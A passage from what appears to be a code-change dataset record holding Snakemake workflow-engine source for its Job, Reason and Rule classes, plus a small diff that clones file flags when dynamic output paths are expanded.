self.dependencies)=rule.expand_wildcards(self.wildcards_dict) self.resources_dict={ name: min(self.rule.workflow.global_resources.get(name, res), res) for name, res in rule.resources.items() } self.threads=self.resources_dict[\"_cores\"] self.resources=Resources(fromdict=self.resources_dict) self._inputsize=None self.dynamic_output, self.dynamic_input=set(), set() self.temp_output, self.protected_output=set(), set() self.touch_output=set() self.subworkflow_input=dict() for f in self.output: f_=self.ruleio[f] if f_ in self.rule.dynamic_output: self.dynamic_output.add(f) if f_ in self.rule.temp_output: self.temp_output.add(f) if f_ in self.rule.protected_output: self.protected_output.add(f) if f_ in self.rule.touch_output: self.touch_output.add(f) for f in self.input: f_=self.ruleio[f] if f_ in self.rule.dynamic_input: self.dynamic_input.add(f) if f_ in self.rule.subworkflow_input: self.subworkflow_input[f]=self.rule.subworkflow_input[f_] self._hash=self.rule.__hash__() if True or not self.dynamic_output: for o in self.output: self._hash ^=o.__hash__() @property def priority(self): return self.dag.priority(self) @property def b64id(self): return base64.b64encode((self.rule.name +\"\".join(self.output) ).encode(\"utf-8\")).decode(\"utf-8\") @property def inputsize(self): \"\"\" Return the size of the input files. Input files need to be present. \"\"\" if self._inputsize is None: self._inputsize=sum(f.size for f in self.input) return self._inputsize @property def message(self): \"\"\" Return the message for this job. \"\"\" try: return(self.format_wildcards(self.rule.message) if self.rule.message else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable in message \" \"of shell command:{}\".format(str(ex)), rule=self.rule) @property def shellcmd(self): \"\"\" Return the shell command. \"\"\" try: return(self.format_wildcards(self.rule.shellcmd) if self.rule.shellcmd else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable when printing \" \"shell command:{}\".format(str(ex)), rule=self.rule) @property def expanded_output(self): \"\"\" Iterate over output files while dynamic output is expanded. \"\"\" for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: expansion=self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill) if not expansion: yield f_ for f, _ in expansion: yield IOFile(f, self.rule) else: yield f @property def dynamic_wildcards(self): \"\"\" Return all wildcard values determined from dynamic output. \"\"\" combinations=set() for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: for f, w in self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): combinations.add(tuple(w.items())) wildcards=defaultdict(list) for combination in combinations: for name, value in combination: wildcards[name].append(value) return wildcards @property def missing_input(self): \"\"\" Return missing input files. \"\"\" return set(f for f in self.input if not f.exists and not f in self.subworkflow_input) @property def output_mintime(self): \"\"\" Return oldest output file. \"\"\" existing=[f.mtime for f in self.expanded_output if f.exists] if self.benchmark and self.benchmark.exists: existing.append(self.benchmark.mtime) if existing: return min(existing) return None @property def input_maxtime(self): \"\"\" Return newest input file. \"\"\" existing=[f.mtime for f in self.input if f.exists] if existing: return max(existing) return None def missing_output(self, requested=None): \"\"\" Return missing output files. \"\"\" files=set() if self.benchmark and(requested is None or self.benchmark in requested): if not self.benchmark.exists: files.add(self.benchmark) for f, f_ in zip(self.output, self.rule.output): if requested is None or f in requested: if f in self.dynamic_output: if not self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): files.add(\"{}(dynamic)\".format(f_)) elif not f.exists: files.add(f) return files @property def existing_output(self): return filter(lambda f: f.exists, self.expanded_output) def check_protected_output(self): protected=list(filter(lambda f: f.protected, self.expanded_output)) if protected: raise ProtectedOutputException(self.rule, protected) def prepare(self): \"\"\" Prepare execution of job. This includes creation of directories and deletion of previously created dynamic files. \"\"\" self.check_protected_output() unexpected_output=self.dag.reason(self).missing_output.intersection( self.existing_output) if unexpected_output: logger.warning( \"Warning: the following output files of rule{} were not \" \"present when the DAG was created:\\n{}\".format( self.rule, unexpected_output)) if self.dynamic_output: for f, _ in chain(*map(partial(self.expand_dynamic, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill), self.rule.dynamic_output)): os.remove(f) for f, f_ in zip(self.output, self.rule.output): f.prepare() for f in self.log: f.prepare() if self.benchmark: self.benchmark.prepare() def cleanup(self): \"\"\" Cleanup output files. \"\"\" to_remove=[f for f in self.expanded_output if f.exists] if to_remove: logger.info(\"Removing output files of failed job{}\" \" since they might be corrupted:\\n{}\".format( self, \", \".join(to_remove))) for f in to_remove: f.remove() def format_wildcards(self, string, **variables): \"\"\" Format a string with variables from the job. \"\"\" _variables=dict() _variables.update(self.rule.workflow.globals) _variables.update(dict(input=self.input, output=self.output, params=self.params, wildcards=self._format_wildcards, threads=self.threads, resources=self.resources, log=self.log, version=self.rule.version, rule=self.rule.name,)) _variables.update(variables) try: return format(string, **_variables) except NameError as ex: raise RuleException(\"NameError: \" +str(ex), rule=self.rule) except IndexError as ex: raise RuleException(\"IndexError: \" +str(ex), rule=self.rule) def properties(self, omit_resources=\"_cores _nodes\".split()): resources={ name: res for name, res in self.resources.items() if name not in omit_resources } params={name: value for name, value in self.params.items()} properties={ \"rule\": self.rule.name, \"local\": self.dag.workflow.is_local(self.rule), \"input\": self.input, \"output\": self.output, \"params\": params, \"threads\": self.threads, \"resources\": resources } return properties def json(self): return json.dumps(self.properties()) def __repr__(self): return self.rule.name def __eq__(self, other): if other is None: return False return self.rule==other.rule and( self.dynamic_output or self.wildcards_dict==other.wildcards_dict) def __lt__(self, other): return self.rule.__lt__(other.rule) def __gt__(self, other): return self.rule.__gt__(other.rule) def __hash__(self): return self._hash @staticmethod def expand_dynamic(pattern, restriction=None, omit_value=None): \"\"\" Expand dynamic files. \"\"\" return list(listfiles(pattern, restriction=restriction, omit_value=omit_value)) class Reason: def __init__(self): self.updated_input=set() self.updated_input_run=set() self.missing_output=set() self.incomplete_output=set() self.forced=False self.noio=False self.nooutput=False self.derived=True def __str__(self): s=list() if self.forced: s.append(\"Forced execution\") else: if self.noio: s.append(\"Rules with neither input nor \" \"output files are always executed.\") elif self.nooutput: s.append(\"Rules with a run or shell declaration but no output \" \"are always executed.\") else: if self.missing_output: s.append(\"Missing output files:{}\".format( \", \".join(self.missing_output))) if self.incomplete_output: s.append(\"Incomplete output files:{}\".format( \", \".join(self.incomplete_output))) updated_input=self.updated_input -self.updated_input_run if updated_input: s.append(\"Updated input files:{}\".format( \", \".join(updated_input))) if self.updated_input_run: s.append(\"Input files updated by another job:{}\".format( \", \".join(self.updated_input_run))) s=\"; \".join(s) return s def __bool__(self): return bool(self.updated_input or self.missing_output or self.forced or self.updated_input_run or self.noio or self.nooutput) ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport sys\nimport base64\nimport json\n\nfrom collections import defaultdict\nfrom itertools import chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.io import IOFile, Wildcards, Resources, _IOFile\nfrom snakemake.utils import format, listfiles\nfrom snakemake.exceptions import RuleException, ProtectedOutputException\nfrom snakemake.exceptions import UnexpectedOutputException\nfrom snakemake.logging import logger\n\n\ndef jobfiles(jobs, type):\n    return chain(*map(attrgetter(type), jobs))\n\n\nclass Job:\n    HIGHEST_PRIORITY = sys.maxsize\n\n    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):\n        self.rule = rule\n        self.dag = dag\n        self.targetfile = targetfile\n\n        self.wildcards_dict = self.rule.get_wildcards(targetfile)\n        self.wildcards = Wildcards(fromdict=self.wildcards_dict)\n        self._format_wildcards = (self.wildcards if format_wildcards is None\n                                  else Wildcards(fromdict=format_wildcards))\n\n        (self.input, self.output, self.params, self.log, self.benchmark,\n         self.ruleio,\n         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)\n\n        self.resources_dict = {\n            name: min(self.rule.workflow.global_resources.get(name, res), res)\n            for name, res in rule.resources.items()\n        }\n        self.threads = self.resources_dict[\"_cores\"]\n        self.resources = Resources(fromdict=self.resources_dict)\n        self._inputsize = None\n\n        self.dynamic_output, self.dynamic_input = set(), set()\n        self.temp_output, self.protected_output = set(), set()\n        self.touch_output = set()\n        self.subworkflow_input = dict()\n        for f in self.output:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_output:\n                self.dynamic_output.add(f)\n            if f_ in self.rule.temp_output:\n                self.temp_output.add(f)\n            if f_ in self.rule.protected_output:\n                self.protected_output.add(f)\n            if f_ in self.rule.touch_output:\n                self.touch_output.add(f)\n        for f in self.input:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_input:\n                self.dynamic_input.add(f)\n            if f_ in self.rule.subworkflow_input:\n                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]\n        self._hash = self.rule.__hash__()\n        if True or not self.dynamic_output:\n            for o in self.output:\n                self._hash ^= o.__hash__()\n\n    @property\n    def priority(self):\n        return self.dag.priority(self)\n\n    @property\n    def b64id(self):\n        return base64.b64encode((self.rule.name + \"\".join(self.output)\n                                 ).encode(\"utf-8\")).decode(\"utf-8\")\n\n    @property\n    def inputsize(self):\n        \"\"\"\n        Return the size of the input files.\n        Input files need to be present.\n        \"\"\"\n        if self._inputsize is None:\n            self._inputsize = sum(f.size for f in self.input)\n        return self._inputsize\n\n    @property\n    def message(self):\n        \"\"\" Return the message for this job. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.message) if\n                    self.rule.message else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable in message \"\n                                \"of shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def shellcmd(self):\n        \"\"\" Return the shell command. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.shellcmd) if\n                    self.rule.shellcmd else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable when printing \"\n                                \"shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def expanded_output(self):\n        \"\"\" Iterate over output files while dynamic output is expanded. \"\"\"\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                expansion = self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill)\n                if not expansion:\n                    yield f_\n                for f, _ in expansion:\n                    yield IOFile(f, self.rule)\n            else:\n                yield f\n\n    @property\n    def dynamic_wildcards(self):\n        \"\"\" Return all wildcard values determined from dynamic output. \"\"\"\n        combinations = set()\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                for f, w in self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill):\n                    combinations.add(tuple(w.items()))\n        wildcards = defaultdict(list)\n        for combination in combinations:\n            for name, value in combination:\n                wildcards[name].append(value)\n        return wildcards\n\n    @property\n    def missing_input(self):\n        \"\"\" Return missing input files. \"\"\"\n        # omit file if it comes from a subworkflow\n        return set(f for f in self.input\n                   if not f.exists and not f in self.subworkflow_input)\n\n    @property\n    def output_mintime(self):\n        \"\"\" Return oldest output file. \"\"\"\n        existing = [f.mtime for f in self.expanded_output if f.exists]\n        if self.benchmark and self.benchmark.exists:\n            existing.append(self.benchmark.mtime)\n        if existing:\n            return min(existing)\n        return None\n\n    @property\n    def input_maxtime(self):\n        \"\"\" Return newest input file. \"\"\"\n        existing = [f.mtime for f in self.input if f.exists]\n        if existing:\n            return max(existing)\n        return None\n\n    def missing_output(self, requested=None):\n        \"\"\" Return missing output files. \"\"\"\n        files = set()\n        if self.benchmark and (requested is None or\n                               self.benchmark in requested):\n            if not self.benchmark.exists:\n                files.add(self.benchmark)\n\n        for f, f_ in zip(self.output, self.rule.output):\n            if requested is None or f in requested:\n                if f in self.dynamic_output:\n                    if not self.expand_dynamic(\n                        f_,\n                        restriction=self.wildcards,\n                        omit_value=_IOFile.dynamic_fill):\n                        files.add(\"{} (dynamic)\".format(f_))\n                elif not f.exists:\n                    files.add(f)\n        return files\n\n    @property\n    def existing_output(self):\n        return filter(lambda f: f.exists, self.expanded_output)\n\n    def check_protected_output(self):\n        protected = list(filter(lambda f: f.protected, self.expanded_output))\n        if protected:\n            raise ProtectedOutputException(self.rule, protected)\n\n    def prepare(self):\n        \"\"\"\n        Prepare execution of job.\n        This includes creation of directories and deletion of previously\n        created dynamic files.\n        \"\"\"\n\n        self.check_protected_output()\n\n        unexpected_output = self.dag.reason(self).missing_output.intersection(\n            self.existing_output)\n        if unexpected_output:\n            logger.warning(\n                \"Warning: the following output files of rule {} were not \"\n                \"present when the DAG was created:\\n{}\".format(\n                    self.rule, unexpected_output))\n\n        if self.dynamic_output:\n            for f, _ in chain(*map(partial(self.expand_dynamic,\n                                           restriction=self.wildcards,\n                                           omit_value=_IOFile.dynamic_fill),\n                                   self.rule.dynamic_output)):\n                os.remove(f)\n        for f, f_ in zip(self.output, self.rule.output):\n            f.prepare()\n        for f in self.log:\n            f.prepare()\n        if self.benchmark:\n            self.benchmark.prepare()\n\n    def cleanup(self):\n        \"\"\" Cleanup output files. \"\"\"\n        to_remove = [f for f in self.expanded_output if f.exists]\n        if to_remove:\n            logger.info(\"Removing output files of failed job {}\"\n                        \" since they might be corrupted:\\n{}\".format(\n                            self, \", \".join(to_remove)))\n            for f in to_remove:\n                f.remove()\n\n    def format_wildcards(self, string, **variables):\n        \"\"\" Format a string with variables from the job. \"\"\"\n        _variables = dict()\n        _variables.update(self.rule.workflow.globals)\n        _variables.update(dict(input=self.input,\n                               output=self.output,\n                               params=self.params,\n                               wildcards=self._format_wildcards,\n                               threads=self.threads,\n                               resources=self.resources,\n                               log=self.log,\n                               version=self.rule.version,\n                               rule=self.rule.name, ))\n        _variables.update(variables)\n        try:\n            return format(string, **_variables)\n        except NameError as ex:\n            raise RuleException(\"NameError: \" + str(ex), rule=self.rule)\n        except IndexError as ex:\n            raise RuleException(\"IndexError: \" + str(ex), rule=self.rule)\n\n    def properties(self, omit_resources=\"_cores _nodes\".split()):\n        resources = {\n            name: res\n            for name, res in self.resources.items()\n            if name not in omit_resources\n        }\n        params = {name: value for name, value in self.params.items()}\n        properties = {\n            \"rule\": self.rule.name,\n            \"local\": self.dag.workflow.is_local(self.rule),\n            \"input\": self.input,\n            \"output\": self.output,\n            \"params\": params,\n            \"threads\": self.threads,\n            \"resources\": resources\n        }\n        return properties\n\n    def json(self):\n        return json.dumps(self.properties())\n\n    def __repr__(self):\n        return self.rule.name\n\n    def __eq__(self, other):\n        if other is None:\n            return False\n        return self.rule == other.rule and (\n            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)\n\n    def __lt__(self, other):\n        return self.rule.__lt__(other.rule)\n\n    def __gt__(self, other):\n        return self.rule.__gt__(other.rule)\n\n    def __hash__(self):\n        return self._hash\n\n    @staticmethod\n    def expand_dynamic(pattern, restriction=None, omit_value=None):\n        \"\"\" Expand dynamic files. \"\"\"\n        return list(listfiles(pattern,\n                              restriction=restriction,\n                              omit_value=omit_value))\n\n\nclass Reason:\n    def __init__(self):\n        self.updated_input = set()\n        self.updated_input_run = set()\n        self.missing_output = set()\n        self.incomplete_output = set()\n        self.forced = False\n        self.noio = False\n        self.nooutput = False\n        self.derived = True\n\n    def __str__(self):\n        s = list()\n        if self.forced:\n            s.append(\"Forced execution\")\n        else:\n            if self.noio:\n                s.append(\"Rules with neither input nor \"\n                         \"output files are always executed.\")\n            elif self.nooutput:\n                s.append(\"Rules with a run or shell declaration but no output \"\n                         \"are always executed.\")\n            else:\n                if self.missing_output:\n                    s.append(\"Missing output files: {}\".format(\n                        \", \".join(self.missing_output)))\n                if self.incomplete_output:\n                    s.append(\"Incomplete output files: {}\".format(\n                        \", \".join(self.incomplete_output)))\n                updated_input = self.updated_input - self.updated_input_run\n                if updated_input:\n                    s.append(\"Updated input files: {}\".format(\n                        \", \".join(updated_input)))\n                if self.updated_input_run:\n                    s.append(\"Input files updated by another job: {}\".format(\n                        \", \".join(self.updated_input_run)))\n        s = \"; \".join(s)\n        return s\n\n    def __bool__(self):\n        return bool(self.updated_input or self.missing_output or self.forced or\n                    self.updated_input_run or self.noio or self.nooutput)\n"}, "/snakemake/remote_providers/__init__.py": {"changes": [{"diff": "-0,", "add": 0, "remove": 0, "filename": "/snakemake/remote_providers/__init__.py", "badparts": ["0,"], "goodparts": []}]}, "/snakemake/rules.py": {"changes": [{"diff": "\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re", "add": 6, "remove": 1, "filename": "/snakemake/rules.py", "badparts": ["                        expansion[i].append(IOFile(e, rule=branch))"], "goodparts": ["                        ioFile = IOFile(e, rule=branch)", "                        ioFile.clone_flags(f)", "                        expansion[i].append(ioFile)"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import sys import inspect import sre_constants from collections import defaultdict from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log from snakemake.io import apply_wildcards, is_flagged, not_iterable from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException class Rule: def __init__(self, *args, lineno=None, snakefile=None): \"\"\" Create a rule Arguments name --the name of the rule \"\"\" if len(args)==2: name, workflow=args self.name=name self.workflow=workflow self.docstring=None self.message=None self._input=InputFiles() self._output=OutputFiles() self._params=Params() self.dependencies=dict() self.dynamic_output=set() self.dynamic_input=set() self.temp_output=set() self.protected_output=set() self.touch_output=set() self.subworkflow_input=dict() self.resources=dict(_cores=1, _nodes=1) self.priority=0 self.version=None self._log=Log() self._benchmark=None self.wildcard_names=set() self.lineno=lineno self.snakefile=snakefile self.run_func=None self.shellcmd=None self.norun=False elif len(args)==1: other=args[0] self.name=other.name self.workflow=other.workflow self.docstring=other.docstring self.message=other.message self._input=InputFiles(other._input) self._output=OutputFiles(other._output) self._params=Params(other._params) self.dependencies=dict(other.dependencies) self.dynamic_output=set(other.dynamic_output) self.dynamic_input=set(other.dynamic_input) self.temp_output=set(other.temp_output) self.protected_output=set(other.protected_output) self.touch_output=set(other.touch_output) self.subworkflow_input=dict(other.subworkflow_input) self.resources=other.resources self.priority=other.priority self.version=other.version self._log=other._log self._benchmark=other._benchmark self.wildcard_names=set(other.wildcard_names) self.lineno=other.lineno self.snakefile=other.snakefile self.run_func=other.run_func self.shellcmd=other.shellcmd self.norun=other.norun def dynamic_branch(self, wildcards, input=True): def get_io(rule): return(rule.input, rule.dynamic_input) if input else( rule.output, rule.dynamic_output ) io, dynamic_io=get_io(self) branch=Rule(self) io_, dynamic_io_=get_io(branch) expansion=defaultdict(list) for i, f in enumerate(io): if f in dynamic_io: try: for e in reversed(expand(f, zip, **wildcards)): expansion[i].append(IOFile(e, rule=branch)) except KeyError: return None replacements=[(i, io[i], e) for i, e in reversed(list(expansion.items()))] for i, old, exp in replacements: dynamic_io_.remove(old) io_.insert_items(i, exp) if not input: for i, old, exp in replacements: if old in branch.temp_output: branch.temp_output.discard(old) branch.temp_output.update(exp) if old in branch.protected_output: branch.protected_output.discard(old) branch.protected_output.update(exp) if old in branch.touch_output: branch.touch_output.discard(old) branch.touch_output.update(exp) branch.wildcard_names.clear() non_dynamic_wildcards=dict((name, values[0]) for name, values in wildcards.items() if len(set(values))==1) (branch._input, branch._output, branch._params, branch._log, branch._benchmark, _, branch.dependencies )=branch.expand_wildcards(wildcards=non_dynamic_wildcards) return branch, non_dynamic_wildcards return branch def has_wildcards(self): \"\"\" Return True if rule contains wildcards. \"\"\" return bool(self.wildcard_names) @property def benchmark(self): return self._benchmark @benchmark.setter def benchmark(self, benchmark): self._benchmark=IOFile(benchmark, rule=self) @property def input(self): return self._input def set_input(self, *input, **kwinput): \"\"\" Add a list of input files. Recursive lists are flattened. Arguments input --the list of input files \"\"\" for item in input: self._set_inoutput_item(item) for name, item in kwinput.items(): self._set_inoutput_item(item, name=name) @property def output(self): return self._output @property def products(self): products=list(self.output) if self.benchmark: products.append(self.benchmark) return products def set_output(self, *output, **kwoutput): \"\"\" Add a list of output files. Recursive lists are flattened. Arguments output --the list of output files \"\"\" for item in output: self._set_inoutput_item(item, output=True) for name, item in kwoutput.items(): self._set_inoutput_item(item, output=True, name=name) for item in self.output: if self.dynamic_output and item not in self.dynamic_output: raise SyntaxError( \"A rule with dynamic output may not define any \" \"non-dynamic output files.\") wildcards=item.get_wildcard_names() if self.wildcard_names: if self.wildcard_names !=wildcards: raise SyntaxError( \"Not all output files of rule{} \" \"contain the same wildcards.\".format(self.name)) else: self.wildcard_names=wildcards def _set_inoutput_item(self, item, output=False, name=None): \"\"\" Set an item to be input or output. Arguments item --the item inoutput --either a Namedlist of input or output items name --an optional name for the item \"\"\" inoutput=self.output if output else self.input if isinstance(item, str): if isinstance(item, _IOFile): self.dependencies[item]=item.rule _item=IOFile(item, rule=self) if is_flagged(item, \"temp\"): if not output: raise SyntaxError(\"Only output files may be temporary\") self.temp_output.add(_item) if is_flagged(item, \"protected\"): if not output: raise SyntaxError(\"Only output files may be protected\") self.protected_output.add(_item) if is_flagged(item, \"touch\"): if not output: raise SyntaxError( \"Only output files may be marked for touching.\") self.touch_output.add(_item) if is_flagged(item, \"dynamic\"): if output: self.dynamic_output.add(_item) else: self.dynamic_input.add(_item) if is_flagged(item, \"subworkflow\"): if output: raise SyntaxError( \"Only input files may refer to a subworkflow\") else: self.subworkflow_input[_item]=item.flags[\"subworkflow\"] inoutput.append(_item) if name: inoutput.add_name(name) elif callable(item): if output: raise SyntaxError( \"Only input files can be specified as functions\") inoutput.append(item) if name: inoutput.add_name(name) else: try: start=len(inoutput) for i in item: self._set_inoutput_item(i, output=output) if name: inoutput.set_name(name, start, end=len(inoutput)) except TypeError: raise SyntaxError( \"Input and output files have to be specified as strings or lists of strings.\") @property def params(self): return self._params def set_params(self, *params, **kwparams): for item in params: self._set_params_item(item) for name, item in kwparams.items(): self._set_params_item(item, name=name) def _set_params_item(self, item, name=None): if isinstance(item, str) or callable(item): self.params.append(item) if name: self.params.add_name(name) else: try: start=len(self.params) for i in item: self._set_params_item(i) if name: self.params.set_name(name, start, end=len(self.params)) except TypeError: raise SyntaxError(\"Params have to be specified as strings.\") @property def log(self): return self._log def set_log(self, *logs, **kwlogs): for item in logs: self._set_log_item(item) for name, item in kwlogs.items(): self._set_log_item(item, name=name) def _set_log_item(self, item, name=None): if isinstance(item, str) or callable(item): self.log.append(IOFile(item, rule=self) if isinstance(item, str) else item) if name: self.log.add_name(name) else: try: start=len(self.log) for i in item: self._set_log_item(i) if name: self.log.set_name(name, start, end=len(self.log)) except TypeError: raise SyntaxError(\"Log files have to be specified as strings.\") def expand_wildcards(self, wildcards=None): \"\"\" Expand wildcards depending on the requested output or given wildcards dict. \"\"\" def concretize_iofile(f, wildcards): if not isinstance(f, _IOFile): return IOFile(f, rule=self) else: return f.apply_wildcards(wildcards, fill_missing=f in self.dynamic_input, fail_dynamic=self.dynamic_output) def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj, concretize=apply_wildcards, ruleio=None): for name, item in olditems.allitems(): start=len(newitems) is_iterable=True if callable(item): try: item=item(wildcards_obj) except(Exception, BaseException) as e: raise InputFunctionException(e, rule=self) if not_iterable(item): item=[item] is_iterable=False for item_ in item: if not isinstance(item_, str): raise RuleException( \"Input function did not return str or list of str.\", rule=self) concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ else: if not_iterable(item): item=[item] is_iterable=False for item_ in item: concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ if name: newitems.set_name( name, start, end=len(newitems) if is_iterable else None) if wildcards is None: wildcards=dict() missing_wildcards=self.wildcard_names -set(wildcards.keys()) if missing_wildcards: raise RuleException( \"Could not resolve wildcards in rule{}:\\n{}\".format( self.name, \"\\n\".join(self.wildcard_names)), lineno=self.lineno, snakefile=self.snakefile) ruleio=dict() try: input=InputFiles() wildcards_obj=Wildcards(fromdict=wildcards) _apply_wildcards(input, self.input, wildcards, wildcards_obj, concretize=concretize_iofile, ruleio=ruleio) params=Params() _apply_wildcards(params, self.params, wildcards, wildcards_obj) output=OutputFiles(o.apply_wildcards(wildcards) for o in self.output) output.take_names(self.output.get_names()) dependencies={ None if f is None else f.apply_wildcards(wildcards): rule for f, rule in self.dependencies.items() } ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output))) log=Log() _apply_wildcards(log, self.log, wildcards, wildcards_obj, concretize=concretize_iofile) benchmark=self.benchmark.apply_wildcards( wildcards) if self.benchmark else None return input, output, params, log, benchmark, ruleio, dependencies except WildcardError as ex: raise RuleException( \"Wildcards in input, params, log or benchmark file of rule{} cannot be \" \"determined from output files:\\n{}\".format(self, str(ex)), lineno=self.lineno, snakefile=self.snakefile) def is_producer(self, requested_output): \"\"\" Returns True if this rule is a producer of the requested output. \"\"\" try: for o in self.products: if o.match(requested_output): return True return False except sre_constants.error as ex: raise IOFileException(\"{} in wildcard statement\".format(ex), snakefile=self.snakefile, lineno=self.lineno) except ValueError as ex: raise IOFileException(\"{}\".format(ex), snakefile=self.snakefile, lineno=self.lineno) def get_wildcards(self, requested_output): \"\"\" Update the given wildcard dictionary by matching regular expression output files to the requested concrete ones. Arguments wildcards --a dictionary of wildcards requested_output --a concrete filepath \"\"\" if requested_output is None: return dict() bestmatchlen=0 bestmatch=None for o in self.products: match=o.match(requested_output) if match: l=self.get_wildcard_len(match.groupdict()) if not bestmatch or bestmatchlen > l: bestmatch=match.groupdict() bestmatchlen=l return bestmatch @staticmethod def get_wildcard_len(wildcards): \"\"\" Return the length of the given wildcard values. Arguments wildcards --a dict of wildcards \"\"\" return sum(map(len, wildcards.values())) def __lt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp < 0 def __gt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp > 0 def __str__(self): return self.name def __hash__(self): return self.name.__hash__() def __eq__(self, other): return self.name==other.name class Ruleorder: def __init__(self): self.order=list() def add(self, *rulenames): \"\"\" Records the order of given rules as rule1 > rule2 > rule3,... \"\"\" self.order.append(list(rulenames)) def compare(self, rule1, rule2): \"\"\" Return whether rule2 has a higher priority than rule1. \"\"\" for clause in reversed(self.order): try: i=clause.index(rule1.name) j=clause.index(rule2.name) comp=j -i if comp < 0: comp=-1 elif comp > 0: comp=1 return comp except ValueError: pass wildcard_cmp=rule2.has_wildcards() -rule1.has_wildcards() if wildcard_cmp !=0: return wildcard_cmp return 0 def __iter__(self): return self.order.__iter__() ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport sys\nimport inspect\nimport sre_constants\nfrom collections import defaultdict\n\nfrom snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist\nfrom snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log\nfrom snakemake.io import apply_wildcards, is_flagged, not_iterable\nfrom snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException\n\n\nclass Rule:\n    def __init__(self, *args, lineno=None, snakefile=None):\n        \"\"\"\n        Create a rule\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if len(args) == 2:\n            name, workflow = args\n            self.name = name\n            self.workflow = workflow\n            self.docstring = None\n            self.message = None\n            self._input = InputFiles()\n            self._output = OutputFiles()\n            self._params = Params()\n            self.dependencies = dict()\n            self.dynamic_output = set()\n            self.dynamic_input = set()\n            self.temp_output = set()\n            self.protected_output = set()\n            self.touch_output = set()\n            self.subworkflow_input = dict()\n            self.resources = dict(_cores=1, _nodes=1)\n            self.priority = 0\n            self.version = None\n            self._log = Log()\n            self._benchmark = None\n            self.wildcard_names = set()\n            self.lineno = lineno\n            self.snakefile = snakefile\n            self.run_func = None\n            self.shellcmd = None\n            self.norun = False\n        elif len(args) == 1:\n            other = args[0]\n            self.name = other.name\n            self.workflow = other.workflow\n            self.docstring = other.docstring\n            self.message = other.message\n            self._input = InputFiles(other._input)\n            self._output = OutputFiles(other._output)\n            self._params = Params(other._params)\n            self.dependencies = dict(other.dependencies)\n            self.dynamic_output = set(other.dynamic_output)\n            self.dynamic_input = set(other.dynamic_input)\n            self.temp_output = set(other.temp_output)\n            self.protected_output = set(other.protected_output)\n            self.touch_output = set(other.touch_output)\n            self.subworkflow_input = dict(other.subworkflow_input)\n            self.resources = other.resources\n            self.priority = other.priority\n            self.version = other.version\n            self._log = other._log\n            self._benchmark = other._benchmark\n            self.wildcard_names = set(other.wildcard_names)\n            self.lineno = other.lineno\n            self.snakefile = other.snakefile\n            self.run_func = other.run_func\n            self.shellcmd = other.shellcmd\n            self.norun = other.norun\n\n    def dynamic_branch(self, wildcards, input=True):\n        def get_io(rule):\n            return (rule.input, rule.dynamic_input) if input else (\n                rule.output, rule.dynamic_output\n            )\n\n        io, dynamic_io = get_io(self)\n\n        branch = Rule(self)\n        io_, dynamic_io_ = get_io(branch)\n\n        expansion = defaultdict(list)\n        for i, f in enumerate(io):\n            if f in dynamic_io:\n                try:\n                    for e in reversed(expand(f, zip, **wildcards)):\n                        